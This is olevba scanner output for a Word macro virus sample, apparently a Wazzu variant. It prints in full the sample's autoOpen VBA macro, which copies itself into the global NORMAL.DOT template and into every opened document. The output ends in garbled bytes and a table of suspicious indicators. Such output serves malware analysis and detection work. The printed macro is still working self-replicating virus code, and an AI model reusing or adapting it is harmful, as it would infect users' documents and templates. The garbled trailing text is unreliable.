olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Wazzu-based-6404084df3fc60903e436e0b24e92674aba4e079
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Wazzu-based-6404084df3fc60903e436e0b24e92674aba4e079 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO autoOpen.bas 
in file: Virus.MSWord.Wazzu-based-6404084df3fc60903e436e0b24e92674aba4e079 - OLE stream: 'Macros/VBA/autoOpen'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Attribute MAIN.VB_Description = "F%"
Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.autoOpen.MAIN"
Dim fileMacro$
Dim globMacro$
Dim MacroFile$
Rem     On Error Goto errCaught
        
    WordBasic.FileSummaryInfo Update:=1
    Dim dlg As Object: Set dlg = WordBasic.DialogRecord.FileSummaryInfo(False)
    WordBasic.CurValues.FileSummaryInfo dlg

    fileMacro$ = dlg.Directory + "\" + dlg.FileName + ":autoOpen"
    globMacro$ = "Global:autoOpen"
    MacroFile$ = UCase(WordBasic.[Right$](WordBasic.[MacroFileName$](WordBasic.[MacroName$](0)), 10))

    If MacroFile$ = "NORMAL.DOT" Then
        WordBasic.MacroCopy globMacro$, fileMacro$
        WordBasic.FileSaveAs Format:=1
    Else
        WordBasic.MacroCopy fileMacro$, globMacro$
    End If

Rem     Payload

Rem Goto bye
Rem errCaught:

Rem bye:
Rem     On Error Goto 0

End Sub

Rem Sub Payload
Rem     For i = 1 To 3
Rem         If Rnd() < 0.2 Then
Rem             RndWord
REMï®ãáüë®ýëøëüë®ýúë: Redim   : Redim    -1 : Redim  +1+1    -1+1       ElseIf     Function  : Redim      -1               +1           -1
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |autoOpen            |Runs when the Word document is opened        |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

